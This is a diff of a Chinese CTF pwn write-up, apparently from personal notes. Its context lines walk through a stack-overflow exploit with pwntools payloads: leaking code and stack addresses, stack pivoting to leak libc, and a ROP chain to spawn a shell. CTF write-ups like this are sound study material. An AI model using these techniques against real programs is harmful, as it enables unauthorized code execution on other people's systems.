@@ -198,7 +198,7 @@ shell:
 那么思路就是，第一次循环内，用第一个puts先泄漏code段的地址获取code段的基址然后根据偏移就能得到code段的其他地址，在第二个read函数劫持返回回到开始，进入第二次循环。
 第二次循环，用puts函数泄漏stack段的地址，然后开始构造栈迁移并泄漏libc，然后构造ROP获取shell。
 下面是逐步分析。
-第一步，泄漏code段地址
+第一步，泄漏code段地址。
 ```python
 # payload1泄漏code段地址
 payload1 = b'a' * (0x28 - 1) + b'b'
@@ -210,7 +210,7 @@ func_base = func_addr - 0x10138d
 ![[Pasted image 20250211192422.png]]
 将前面填充后可以看到泄漏了code段的地址，偏移是0x10138d，然后就获取了code段的基址。
 ![[Pasted image 20250211192546.png]]
-第二步，栈溢出劫持返回，让程序回到func的开头准备第二次泄漏
+第二步，栈溢出劫持返回，让程序回到func的开头准备第二次泄漏。
 ```python
 # payload2回到func函数再次执行
 payload2 = b'a' * 0x28 + p64(ret) + p64(func_base + 0x101367)
@@ -218,7 +218,7 @@ p.recvuntil(b'berial: ')
 p.send(payload2)
 ```
 ![[Pasted image 20250211192821.png]]
-第三步，再次构造payload泄漏stack段的地址，为栈迁移做准备
+第三步，再次构造payload泄漏stack段的地址，为栈迁移做准备。
 ```python
 # payload3泄漏栈地址
 payload3 = b'a' * (0x20 - 1) + b'c'
@@ -230,7 +230,7 @@ log.success('stack_addr: ' + hex(stack_addr))
 ![[Pasted image 20250211193005.png]]
 第四步，泄露了stack段后开始着手构造栈迁移来泄漏libc基址。
 ![[Pasted image 20250211193129.png]]
-查看栈上空间可以发现有__libc_start_main + 128，将栈迁移过去就可以再次利用puts来泄漏。
+查看栈上空间可以发现有__libc_start_main + 128，将栈迁移过去就可以再次利用puts来泄漏。(栈迁移详见我另一篇文章)
 ```python
 # payload4开始构造栈迁移泄漏libc基址
 payload4 = p64(stack_addr + 0xb0) + p64(func_base + 0x101229) + b'a' * 0x10 + p64(stack_addr - 0x30) + p64(leave_ret) + b'\x00' * 0x8
@@ -323,7 +323,7 @@ p.sendafter(b'berial: ', payload6)
 p.interactive()
 ```
 shell：
-
+![[Pasted image 20250211193735.png]]
 ## unjoke
 
 ## Natro
